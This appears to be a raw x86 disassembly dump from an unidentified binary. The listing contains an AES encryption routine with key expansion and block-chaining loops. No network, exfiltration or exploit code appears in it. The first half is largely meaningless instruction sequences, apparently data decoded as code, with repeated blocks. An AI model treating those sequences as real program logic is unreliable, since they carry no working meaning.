and esp [ ebx ]
inc esi
and esp [ ebx ]
popfd
retn
push 0x6c
pop edx
insb
pop edx
jle r-xdata
dec esp
xchg edi ebp
cli
cli
adc eax 0x15fafaef
mov dl 0x59
pop ecx
jmp r-xdata
mov bh 0xc2
loope r-xdata
aas
inc ecx
cmc
div edi
add dh ch
div edi
add al [ ebx - 0x7cb03334 ]
int3
sbb bl [ edx ]
xor al 0x1a
sbb ch [ esi ]
sbb ebx [ ss : ebx ]
sub eax 0x2d1b1b36
fsubr [ esi + 0x6e ]
mov dl 0xdc
outsb
outsb
mov dl 0xb4
pop edx
pop edx
out dx al
mov ah 0x5a
pop edx
out dx al
pop ebx
mov al [ 0xffffffffa05bfba0 ]
mov al [ 0x5252a4fb ]
mul [ edx + edx * 2 + 0x3b76f652 ]
jge r-xdata
retn 0xfde1
push 0x4c
std
sbb al 0xe1
std
std
sbb al 0x3d
xchg ebx eax
xchg ebx eax
scasb [ edi ]
cmp eax 0x4cae9393
add [ ebx + 0x2c2c589e ] 0x74
pop eax
mov bl 0xce
jge r-xdata
add al [ ecx ]
add [ ebx ] eax
add al [ ecx ]
add [ ebx ] eax
into
test eax 0xa96767ce
push esi
sub ebp [ ebx ]
jge r-xdata
cmp edi [ ebx ]
dec ebp
mov bh 0xd6
sub al 0x2c
je r-xdata
mov bl 0xce
push edx
sub [ ecx ] ebp
leave
mov es [ edi + 0x47 ]
leave
sti
sub ebp [ ebx ]
jecxz r-xdata
sub al 0x2c
je r-xdata
enter 0x5bb6 0x5b
sub [ ecx ] ebp
salc
popad
mov bh 0xd6
salc
popad
jge r-xdata
pop esi
cmp ecx [ ebp + 0x76 ]
push edx
div [ esi + 0x3b ]
jecxz r-xdata
fldenv [ edi - 0x42 ]
mov esi 0x393972d9
dec ebx
jb r-xdata
das
das
jno r-xdata
cmp ecx [ ebp - 0x49 ]
salc
fucom st3
jecxz r-xdata
in eax 0xed
sti
sti
push ss
in eax dx
sti
sti
push ss
xchg [ ebx + 0x43 ] al
lds eax [ esi - 0x653abcbd ]
dec ebp
dec ebp
xlat
0x66d74d4d 0x3333
push ebp
xor si [ ebx ]
push ebp
adc [ ebp - 0x7aee6b7b ] eax
test [ edx + ecx * 4 - 0x7530babb ] edx
inc ebp
inc ebp
iretd
cmp [ ebx - 0x6c ] ecx
dec edx
dec edx
ficom [ edx + ecx * 2 + 0x4c98de4a ]
dec esp
aam 0x98
dec esp
dec esp
aam 0xb0
pop eax
pop eax
call 0xffffffffe89947e8
test edi ecx
iretd
mov ecx 0x68d1d1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl al
in eax dx
in eax dx
sub al 0xc1
in eax dx
in eax dx
sub al 0x40
and [ eax ] ah
pushad
inc eax
and [ eax ] ah
pushad
jecxz r-xdata
test [ edi + edx * 4 - 0x687b7bed ] al
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
mov ecx 0xb968d1d1
rcl ecx 0x1
push 0x0
add [ eax ] al
add [ eax ] al
shr ebp 0xed
cld
pop ds
jns r-xdata
das
das
jno r-xdata
pop esi
and [ eax - 0x1d ] ah
cld
cld
pop ds
jecxz r-xdata
jpo r-xdata
mov cl 0xc8
jns r-xdata
jpo r-xdata
in eax dx
mov dh 0x5b
pop ebx
in eax dx
aam 0x6a
push 0xffffffbe
aam 0x6a
push 0xffffffbe
mov cl 0xc8
mov dh 0x5b
pop ebx
sub_40eddf
pop esi
xor [ eax ] bl
sbb [ eax ] ch
xor [ eax ] bl
sbb [ eax ] ch
aaa
xchg esi eax
xchg esi eax
mov eax [ 0xffffffffa1969637 ]
or al [ 0x50a0f05 ]
add eax 0x9a9a2f0f
mov ch 0x2f
0x70eb59a 0x907
push cs
pop es
pop es
or [ edx + edx ] esp
adc dh [ esi ]
and al 0x12
adc dh [ esi ]
sbb eax [ eax - 0x7fe46480 ]
sbb [ ebx + 0x3de2e2df ] 0xdf
loop r-xdata
pop es
pop es
or [ esi ] ecx
cmp eax 0x26ebebcd
int 0xeb
jmp r-xdata
sbb [ esi + 0x742c2c58 ] 0x58
cmp edi [ ebx ]
dec ebp
mov bh 0xd6
sbb bl [ edx ]
xor al 0x1a
sbb ch [ esi ]
sbb ebx [ ss : ebx ]
sub eax 0x2d1b1b36
fsubr [ esi + 0x6e ]
mov dl 0xdc
outsb
outsb
mov dl 0xb4
pop edx
pop edx
out dx al
mov ah 0x5a
pop edx
out dx al
pop ebx
mov al [ 0xffffffffa05bfba0 ]
mov al [ 0x5252a4fb ]
mul [ edx + edx * 2 + 0x3b76f652 ]
sub al 0x2c
je r-xdata
add [ ebx + 0x2c2c589e ] 0x74
pop eax
mov bl 0xce
jge r-xdata
sub al 0x2c
je r-xdata
mov bl 0xce
push edx
sub [ ecx ] ebp
jecxz r-xdata
enter 0x5bb6 0x5b
sub [ ecx ] ebp
salc
popad
mov bh 0xd6
salc
popad
jge r-xdata
pop esi
cmp ecx [ ebp + 0x76 ]
push edx
div [ esi + 0x3b ]
jecxz r-xdata
fldenv [ edi - 0x42 ]
mov esi 0x393972d9
dec ebx
jb r-xdata
das
das
jno r-xdata
cmp ecx [ ebp - 0x49 ]
salc
fucom st3
jecxz r-xdata
in eax 0xed
sti
sti
push ss
in eax dx
sti
sti
push ss
xchg [ ebx + 0x43 ] al
lds eax [ esi - 0x653abcbd ]
dec ebp
dec ebp
xlat
0x66d74d4d 0x3333
push ebp
xor si [ ebx ]
push ebp
adc [ ebp - 0x7aee6b7b ] eax
test [ edx + ecx * 4 - 0x7530babb ] edx
inc ebp
inc ebp
iretd
cmp [ ebx - 0x6c ] ecx
dec edx
dec edx
ficom [ edx + ecx * 2 + 0x4c98de4a ]
dec esp
aam 0x98
dec esp
dec esp
aam 0xb0
pop eax
pop eax
call 0xffffffffe89947e8
test edi ecx
iretd
mov ecx 0x68d1d1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add cl al
in eax dx
in eax dx
sub al 0xc1
in eax dx
in eax dx
sub al 0x40
and [ eax ] ah
pushad
inc eax
and [ eax ] ah
pushad
jecxz r-xdata
test [ edi + edx * 4 - 0x687b7bed ] al
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
cmpsb [ esi ] [ edi ]
push ebx
push ebx
cmc
mov ecx 0xb968d1d1
rcl ecx 0x1
push 0x0
add [ eax ] al
add [ eax ] al
shr ebp 0xed
cld
pop ds
jns r-xdata
das
das
jno r-xdata
pop esi
and [ eax - 0x1d ] ah
cld
cld
pop ds
jecxz r-xdata
jpo r-xdata
mov cl 0xc8
jns r-xdata
jpo r-xdata
in eax dx
mov dh 0x5b
pop ebx
in eax dx
aam 0x6a
push 0xffffffbe
aam 0x6a
push 0xffffffbe
mov cl 0xc8
mov dh 0x5b
pop ebx
sub_40ef0f
inc esi
mov esi 0xbe67d9be
mov esi 0x393972d9
dec ebx
jb r-xdata
in eax 0xed
sti
sti
push ss
in eax dx
sti
sti
push ss
xchg [ ebx + 0x43 ] al
lds eax [ esi - 0x653abcbd ]
dec ebp
dec ebp
xlat
0x66d74d4d 0x3333
push ebp
xor si [ ebx ]
push ebp
adc [ ebp - 0x7aee6b7b ] eax
test [ edx + ecx * 4 - 0x7530babb ] edx
inc ebp
inc ebp
iretd
cmp [ ebx - 0x6c ] ecx
dec edx
dec edx
ficom [ edx + ecx * 2 + 0x4c98de4a ]
dec esp
aam 0x98
dec esp
dec esp
aam 0xb0
pop eax
pop eax
call 0xffffffffe89947e8
test edi ecx
iretd
sub_40ef3f
dec edx
mov ebx 0xbb6bd0d0
rcl al 0x1
imul eax ebp 0xffffffef
out dx eax
sub al ch
out dx eax
out dx eax
sub cl [ edi - 0x56 ]
stosb [ edi ]
in eax 0x4f
stosb [ edi ]
stosb [ edi ]
in eax 0xed
sti
sti
push ss
in eax dx
sti
sti
push ss
xchg [ ebx + 0x43 ] al
lds eax [ esi - 0x653abcbd ]
dec ebp
dec ebp
xlat
0x66d74d4d 0x3333
push ebp
xor si [ ebx ]
push ebp
adc [ ebp - 0x7aee6b7b ] eax
test [ edx + ecx * 4 - 0x7530babb ] edx
inc ebp
inc ebp
iretd
sub_40f02a
[ edx ]
in eax 0xff
[ edx ]
std
push cs
std
push cs
mov edi 0xbf6dd2d2
rcl dl cl
insd
or ebp 0xcd814ccd
int 0x4c
sbb [ esp + ecx ] cl
adc al 0x18
or al 0xc
adc al 0x26
adc edx [ ebx ]
xor eax 0x35131326
retn
sub_40f086
les edx [ edi + 0x55 ]
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
push ebp
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
cld
jle r-xdata
mov eax 0xb86bd3b8
mov eax 0x141428d3
cmp al 0x28
adc al 0x14
cmp ah 0x7e
jle r-xdata
and [ ebx + 0x42 ] esp
and [ ecx ] esp
arpl [ eax ] sp
adc [ eax ] dl
xor [ eax ] ah
adc [ eax ] dl
xor ch ah
jpe r-xdata
shl [ ebx - 0x5c802324 ] 0x1
cmp eax 0x3d3d7a47
inc edi
enter 0x6464 0xac
enter 0x6464 0xac
mov edx 0xbae75d5d
pop ebp
pop ebp
out 0x32 eax
sbb [ ecx ] ebx
sub esi [ edx ]
sbb [ ecx ] ebx
sub esp esi
jae r-xdata
and ah [ edx ]
inc sp
pop esi
loop r-xdata
xchg ebp eax
out 0x73 al
jae r-xdata
loopne r-xdata
sub ch [ edx ]
jle r-xdata
cmp esp [ edx + esi + 0x32 ]
or ecx [ ebx ]
sbb eax 0x1d0b0b16
lodsd [ esi ]
fcmovnu st3
jbe r-xdata
adc edx [ ebx ]
xor eax 0x2fececc3
retn
fcomp st4
jg r-xdata
shl [ eax + 0x60 ] 0xa0
shl [ eax + 0x60 ] 0xa0
sbb [ ecx - 0x7ee6677f ] eax
sbb [ eax - 0x2eb0b062 ] 0xd14f4f9e
mov [ 0xffffffffa37fdcdc ] eax
jns r-xdata
cmp ebx ebx
loopne r-xdata
mov esp 0x16e25e5e
nop
nop
stosd [ edi ]
cmp edx [ eax - 0x77f45470 ]
mov [ ebx - 0x7c7777f5 ] al
mov [ esi + 0x46 ] es
0x468c
mov ebp 0x436ed3d3
lodsb [ esi ]
lodsb [ esi ]
out dx eax
inc ebx
lodsb [ esi ]
lodsb [ esi ]
out dx eax
les esp [ edx + 0x62 ]
cmpsb [ esi ] [ edi ]
les esp [ edx + 0x62 ]
cmpsb [ esi ] [ edi ]
cmp [ ecx - 0x6ec6576f ] edx
xchg ecx eax
test al 0x31
xchg ebp eax
xchg ebp eax
movsb [ edi ] [ esi ]
xor [ ebp - 0x1b2c5b6b ] edx
in al 0x37
shl esp cl
in al 0x37
r-xdata
cmp cl [ esi + 0x74 ]
cmp bh [ edx ]
dec esi
adc al 0xa
or bl [ esi ]
adc al 0xa
or bl [ esi ]
xchg edx eax
dec ecx
dec ecx
fist [ edx + 0xcdb4949 ]
push es
push es
or cl [ esi + eax ]
push es
or cl [ eax + 0x24 ]
and al 0x6c
dec eax
and al 0x24
insb
mov eax 0xb8e45c5c
pop esp
pop esp
in al 0x9f
retn 0x5dc2
sub bh [ esi + 0x54 ]
fcmovnu st3
jbe r-xdata
sbb [ ecx + 0x4f9e9881 ] eax
dec edi
rcr [ esi - 0x5c2eb0b1 ] 0x1
fcomp st4
jg r-xdata
jns r-xdata
inc edi
scasb [ edi ]
scasb [ edi ]
jmp 0x1848fa4c
mov esi edx
jns r-xdata
cmp al 0xa7
sub [ esp + edx ] dl
xchg ebx eax
and ah [ edx ]
push sp
pop esi
pop esi
loop r-xdata
adc [ eax ] cl
or [ eax ] bl
adc [ eax ] cl
or [ eax ] bl
outsd
mov edx 0xba6fd5ba
mov edx 0x7878f0d5
mov al dh
js r-xdata
mov edx ebp
out 0xe7 eax
xor dl ch
out 0xe7 eax
xor cl [ ebx - 0x74bc3738 ]
enter 0x43c8 0x6e
aaa
sub ch [ edx ]
jle r-xdata
pop esi
nop
mov [ edx + 0x25 ] cl
and eax 0x25254a6f
outsd
push 0x35
xor eax 0x35356a5f
pop edi
scasb [ edi ]
push edi
push edi
inc edx
jl r-xdata
mov cl [ edx - 0x7575f07b ]
test eax esp
jo r-xdata
r-xdata
xor edx [ esp + edx * 4 - 0x6464d259 ]
mov dh 0x2d
fabs
loope r-xdata
stc
scasb [ edi ]
push edi
push edi
stc
imul edi [ ecx - 0x46962f47 ] 0x8617d0b9
xchg [ ecx - 0x6e7979e9 ] dl
cdq
rol ecx 0x58
cdq
rol ecx 0x58
cmp bl [ 0x1d3a271d ]
push 0x35
xor eax 0x5757ae5f
inc edx
jno r-xdata
mov ecx 0xb99e9e27
fabs
daa
cmp bl [ 0xffffffff9e27271d ]
sahf
nop
loopne r-xdata
pop ds
pop ds
and [ esi ] edi
pop ds
pop ds
and [ esi - 0x6922b4b5 ] edx
dec ebx
dec ebx
frstor [ ecx - 0x43 ]
mov ebp 0xbdbd61dc
fmul [ 0xd868b8b ]
mov ecx [ ebx - 0x7575f07a ]
test [ edi ] ecx
mov cl [ edx + 0x7070e085 ]
sbb al 0x1c
and al 0x38
sbb al 0x1c
and al 0x57
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
int1
push edi
cmpsb [ esi ] [ edi ]
cmpsb [ esi ] [ edi ]
int1
jae r-xdata
fwait
fwait
mov dh 0x3c
push ds
push ds
and bh [ esi + ebx ]
push ds
and dl [ 0x15928787 ]
xchg [ edi - 0x1616366e ] eax
and cl cl
jmp 0xffffffffcec8148b
sub eax 0x2db69b9b
jmp r-xdata
and esp [ ecx - 0x5e832223 ]
mov ch 0xc4
jno r-xdata
sbb eax 0x9e9e2727
jo r-xdata
scasd [ edi ]
hlt
mov ah 0xc7
jae r-xdata
loope r-xdata
mov dh 0x51
xchg edi eax
mov dh 0x51

je r-xdata
jl r-xdata
mov ch 0xc4
int3
pop esp
r-xdata
jl r-xdata
jpe r-xdata
mov ah 0xc7
xchg edi eax
mov [ 0x5f35356a ] eax
pushfd
call 0x3edd670d
jpe r-xdata
fstp st5
jl r-xdata
jns r-xdata
hlt
jns r-xdata
inc edi
scasb [ edi ]
scasb [ edi ]
jmp 0xffffffffe9efa07f
r-xdata
push esi
xor dh [ fs : edx ]
push esi
je r-xdata
aaa
pop ecx
outsb
aaa
aaa
pop ecx
fisubr [ ebp + 0x6d ]
mov bh 0xda
insd
insd
mov bh 0x1
lea ecx [ ebp - 0x7272fe74 ]
aad 0xe7
out 0x32 eax
aad 0xe7
out 0x32 eax
mov ecx eax
enter 0x8b43 0xc8
enter 0x6e43 0x37
sub_40f4cf
mov [ esp + 0xc ] edi
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
mov esi [ edi + 0xf0 ]
lea esi [ esi + esi - 0x2 ]
lea esi [ edi + esi * 8 ]
mov [ esp + 0x10 ] esi
nop
mov esi eax
and esi 0xff
mov esi [ ebp + esi * 8 ]
movzx edi dh
xor esi [ ebp + edi * 8 + 0x3 ]
mov edi ecx
shr edi 0x10
and edi 0xff
xor esi [ ebp + edi * 8 + 0x2 ]
mov edi ebx
shr edi 0x18
xor esi [ ebp + edi * 8 + 0x1 ]
mov [ esp + 0x4 ] esi
mov esi ebx
and esi 0xff
mov esi [ ebp + esi * 8 ]
movzx edi ah
xor esi [ ebp + edi * 8 + 0x3 ]
mov edi edx
shr edi 0x10
and edi 0xff
xor esi [ ebp + edi * 8 + 0x2 ]
mov edi ecx
shr edi 0x18
xor esi [ ebp + edi * 8 + 0x1 ]
mov [ esp + 0x8 ] esi
mov esi ecx
and esi 0xff
mov esi [ ebp + esi * 8 ]
movzx edi bh
xor esi [ ebp + edi * 8 + 0x3 ]
mov edi eax
shr edi 0x10
and edi 0xff
xor esi [ ebp + edi * 8 + 0x2 ]
mov edi edx
shr edi 0x18
xor esi [ ebp + edi * 8 + 0x1 ]
mov edi [ esp + 0xc ]
and edx 0xff
mov edx [ ebp + edx * 8 ]
movzx ecx ch
xor edx [ ebp + ecx * 8 + 0x3 ]
mov ecx esi
shr ebx 0x10
and ebx 0xff
xor edx [ ebp + ebx * 8 + 0x2 ]
mov ebx [ esp + 0x8 ]
shr eax 0x18
xor edx [ ebp + eax * 8 + 0x1 ]
mov eax [ esp + 0x4 ]
add edi 0x10
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
cmp edi [ esp + 0x10 ]
mov [ esp + 0xc ] edi
jb r-xdata
mov esi eax
and esi 0xff
movzx esi [ ebp + esi + 0x800 ]
movzx edi dh
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x8
xor esi edi
mov edi ecx
shr edi 0x10
and edi 0xff
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x10
xor esi edi
mov edi ebx
shr edi 0x18
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x18
xor esi edi
mov [ esp + 0x4 ] esi
mov esi ebx
and esi 0xff
movzx esi [ ebp + esi + 0x800 ]
movzx edi ah
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x8
xor esi edi
mov edi edx
shr edi 0x10
and edi 0xff
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x10
xor esi edi
mov edi ecx
shr edi 0x18
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x18
xor esi edi
mov [ esp + 0x8 ] esi
mov esi ecx
and esi 0xff
movzx esi [ ebp + esi + 0x800 ]
movzx edi bh
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x8
xor esi edi
mov edi eax
shr edi 0x10
and edi 0xff
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x10
xor esi edi
mov edi edx
shr edi 0x18
movzx edi [ ebp + edi + 0x800 ]
shl edi 0x18
xor esi edi
mov edi [ esp + 0xc ]
and edx 0xff
movzx edx [ ebp + edx + 0x800 ]
movzx ecx ch
movzx ecx [ ebp + ecx + 0x800 ]
shl ecx 0x8
xor edx ecx
mov ecx esi
shr ebx 0x10
and ebx 0xff
movzx ebx [ ebp + ebx + 0x800 ]
shl ebx 0x10
xor edx ebx
mov ebx [ esp + 0x8 ]
shr eax 0x18
movzx eax [ ebp + eax + 0x800 ]
shl eax 0x18
xor edx eax
mov eax [ esp + 0x4 ]
add edi 0x10
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
retn
sub_4100b3
push ebp
push ebx
push esi
push edi
mov ecx [ esp + 0x1c ]
cmp ecx 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
call $+5
pop ebp
pushfd
cld
cmp [ esp + 0x2c ] 0x0
je r-xdata
lea ebp [ ebp - 0x989 ]
lea edi [ esp - 0x134 ]
and edi 0xffffffc0
mov eax ebp
lea ebx [ ebp + 0x900 ]
mov edx edi
and eax 0xfff
and ebx 0xfff
and edx 0xfff
cmp edx ebx
jb r-xdata
lea ebp [ ebp - 0x1489 ]
lea edi [ esp - 0x134 ]
and edi 0xffffffc0
mov eax ebp
lea ebx [ ebp + 0x800 ]
mov edx edi
and eax 0xfff
and ebx 0xfff
and edx 0xfff
cmp edx ebx
jb r-xdata
sub edx eax
and edx 0xfff
add edx 0x140
sub edi edx
lea ecx [ ecx ]
sub edx ebx
sub edi edx
jmp r-xdata
sub edx eax
and edx 0xfff
add edx 0x140
sub edi edx
sub edx ebx
sub edi edx
jmp r-xdata
mov [ esp + 0x20 ] edi
mov esi esi
[ edi ] [ esi ]
cmp ebx 0xf0c
jb r-xdata
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
mov edx [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
xchg edi esp
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] esi
mov [ esp + 0x12c ] 0x0
mov ebx edx
mov ecx 0x3d
sub ebx ebp
mov esi edx
and ebx 0xfff
lea edi [ esp + 0x3c ]
cmp ebx 0x900
jb r-xdata
mov [ esp + 0x20 ] edi
mov esi esi
[ edi ] [ esi ]
cmp ebx 0xf0c
jb r-xdata
mov eax [ esp + 0x18 ]
mov ebx [ esp + 0x1c ]
mov edx [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
xchg edi esp
add esp 0x4
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] esi
mov [ esp + 0x12c ] 0x0
mov ebx edx
mov ecx 0x3d
sub ebx ebp
mov esi edx
and ebx 0xfff
lea edi [ esp + 0x3c ]
cmp ebx 0x800
jb r-xdata
mov eax [ ebp ]
mov ebx [ ebp + 0x20 ]
mov ecx [ ebp + 0x40 ]
mov edx [ ebp + 0x60 ]
lea ebp [ ebp + 0x80 ]
dec edi
jne r-xdata
sub ebp 0x900
cmp esi [ esp + 0x18 ]
je r-xdata
mov esi eax
mov edi 0x12
nop
lea ecx [ ecx ]
mov eax [ ebp ]
mov ebx [ ebp + 0x20 ]
mov ecx [ ebp + 0x40 ]
mov edx [ ebp + 0x60 ]
lea ebp [ ebp + 0x80 ]
dec edi
jne r-xdata
sub ebp 0x800
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x24 ]
test ecx 0xfffffff0
je r-xdata
mov esi eax
mov edi 0x10
nop
lea ecx [ ecx ]
lea edi [ esp + 0x2c ]
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov edi [ esp + 0x20 ]
call sub_40f4cf
mov edi [ esp + 0x24 ]
mov esi [ esp + 0x18 ]
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
lea esi [ esi + 0x10 ]
mov [ esp + 0x18 ] esi
lea esi [ esp + 0x2c ]
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov esi [ esp + 0x14 ]
lea esi [ esi + 0x10 ]
mov [ esp + 0x14 ] esi
mov ecx [ esp + 0x1c ]
sub ecx 0x10
jb r-xdata
mov edi [ esp + 0x24 ]
mov [ esp + 0x28 ] edi
lea ecx [ ecx ]
push edi
mov edi [ esp + 0x18 ]
mov ebx 0x10
sub ebx ecx
cmp edi esi
je r-xdata
mov eax [ edi ]
mov ebx [ edi + 0x4 ]
mov edi [ esp + 0x18 ]
lea esi [ esp + 0x2c ]
lea edi [ edi + ecx ]
lea esi [ esi + ecx + 0x10 ]
neg ecx
mov esi esi
[ edi ] [ esi ]
lea ecx [ ecx ]
mov [ esp + 0x1c ] ecx
jne r-xdata
lea edi [ esp + 0x2c ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
lea ecx [ esi + 0x10 ]
mov esi edi
mov edi [ esp + 0x18 ]
mov esi esi
[ edi ] [ esi ]
mov edi [ esp + 0x14 ]
jmp r-xdata
mov [ esp + 0x1c ] esi
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov [ esp + 0x28 ] esi
lea esi [ esi + 0x10 ]
mov [ esp + 0x14 ] esi
lea edi [ edi + 0x10 ]
mov [ esp + 0x18 ] edi
jne r-xdata
lea edi [ edi + ecx ]
mov esi esi
[ edi ] [ esi ]
jmp r-xdata
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
xor eax [ esi ]
xor ebx [ esi + 0x4 ]
xor ecx [ esi + 0x8 ]
xor edx [ esi + 0xc ]
mov edi [ esp + 0x20 ]
call sub_40ea00
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov ecx [ esp + 0x1c ]
lea esi [ esi + 0x10 ]
mov [ esp + 0x14 ] esi
lea edx [ edi + 0x10 ]
mov [ esp + 0x18 ] edx
sub ecx 0x10
test ecx 0xfffffff0
mov [ esp + 0x1c ] ecx
jne r-xdata
test ecx 0xf
jne r-xdata
mov esp [ esp + 0x10 ]
popfd
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx 0x3c
xor eax eax
lea ecx [ ecx ]
mov esi esi
[ edi ]
jmp r-xdata
mov esi [ esp + 0x24 ]
mov eax [ edi ]
mov ebx [ edi + 0x4 ]
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov edi [ esp + 0x20 ]
call sub_40f4cf
mov edi [ esp + 0x28 ]
mov esi [ esp + 0x1c ]
xor eax [ edi ]
xor ebx [ edi + 0x4 ]
xor ecx [ edi + 0x8 ]
xor edx [ edi + 0xc ]
sub esi 0x10
jb r-xdata
mov edi [ esp + 0x28 ]
mov ecx ebx
xor eax eax
lea ecx [ ecx ]
mov esi esi
[ edi ]
pop edi
mov esi [ esp + 0x18 ]
mov eax [ edi ]
mov ebx [ edi + 0x4 ]
mov [ esp + 0x1c ] 0x10
jmp r-xdata
mov esi [ esp + 0x24 ]
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0xc ]
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0xc ] edx
cmp [ esp + 0x12c ] 0x0
mov edi [ esp + 0x20 ]
je r-xdata
cmp [ esp + 0x12c ] 0x0
mov edi [ esp + 0x20 ]
je r-xdata
mov esp [ esp + 0x10 ]
popfd
mov ecx 0x3c
xor eax eax
mov esi esi
[ edi ]
sub_4104d2
push ebp
push ebx
push esi
push edi
mov esi [ esp + 0x14 ]
mov edi [ esp + 0x1c ]
test esi 0xffffffff
je r-xdata
mov eax 0xffffffff
test edi 0xffffffff
je r-xdata
call $+5
pop ebp
lea ebp [ ebp - 0x18bb ]
mov ecx [ esp + 0x18 ]
cmp ecx 0x80
je r-xdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
xor ecx ecx
jmp r-xdata
cmp ecx 0xc0
je r-xdata
movzx esi dl
mov ebx [ ebp + esi * 8 + 0x2 ]
movzx esi dh
and ebx 0xff000000
xor eax ebx
mov ebx [ ebp + esi * 8 + 0x2 ]
shr edx 0x10
and ebx 0xff
movzx esi dl
xor eax ebx
mov ebx [ ebp + esi * 8 ]
movzx esi dh
and ebx 0xff00
xor eax ebx
mov ebx [ ebp + esi * 8 ]
and ebx 0xff0000
xor eax ebx
xor eax [ ebp + ecx * 4 + 0x800 ]
mov [ edi + 0x10 ] eax
xor eax [ edi + 0x4 ]
mov [ edi + 0x14 ] eax
xor eax [ edi + 0x8 ]
mov [ edi + 0x18 ] eax
xor eax [ edi + 0xc ]
mov [ edi + 0x1c ] eax
inc ecx
add edi 0x10
cmp ecx 0xa
jl r-xdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
xor ecx ecx
jmp r-xdata
cmp ecx 0x100
je r-xdata
mov eax [ edi ]
mov edx [ edi + 0xc ]
mov [ edi + 0x50 ] 0xa
xor eax eax
jmp r-xdata
movzx esi dl
mov ebx [ ebp + esi * 8 + 0x2 ]
movzx esi dh
and ebx 0xff000000
xor eax ebx
mov ebx [ ebp + esi * 8 + 0x2 ]
shr edx 0x10
and ebx 0xff
movzx esi dl
xor eax ebx
mov ebx [ ebp + esi * 8 ]
movzx esi dh
and ebx 0xff00
xor eax ebx
mov ebx [ ebp + esi * 8 ]
and ebx 0xff0000
xor eax ebx
xor eax [ ebp + ecx * 4 + 0x800 ]
mov [ edi + 0x18 ] eax
xor eax [ edi + 0x4 ]
mov [ edi + 0x1c ] eax
xor eax [ edi + 0x8 ]
mov [ edi + 0x20 ] eax
xor eax [ edi + 0xc ]
mov [ edi + 0x24 ] eax
cmp ecx 0x7
je r-xdata
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov [ edi ] eax
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ecx
mov [ edi + 0xc ] edx
mov eax [ esi + 0x10 ]
mov ebx [ esi + 0x14 ]
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0x1c ]
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] ebx
